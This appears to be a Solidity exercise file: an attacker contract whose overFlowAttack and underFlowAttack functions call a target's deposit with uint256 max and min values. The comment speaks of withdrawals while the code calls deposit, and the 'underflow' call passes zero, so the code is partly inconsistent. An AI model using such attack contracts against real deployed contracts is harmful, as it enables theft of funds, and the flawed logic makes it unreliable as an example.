// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.0;

import "./Exercise_1.sol";

contract OverflowUnderflow{
    Exercise_1 public exercise_1;

    constructor(address _exercise_1) {
        exercise_1 = Exercise_1(_exercise_1);
    }

    /*
    A large amount of ether withdrawal is used to trigger an overflow attack
    Underflow attack is triggered by trying to withdraw more ether than the user has
    */

    function overFlowAttack() public payable{
        exercise_1.deposit(msg.sender, type(uint256).max);
    }

    function underFlowAttack() public payable{
        exercise_1.deposit(msg.sender, type(uint256).min);
    }
}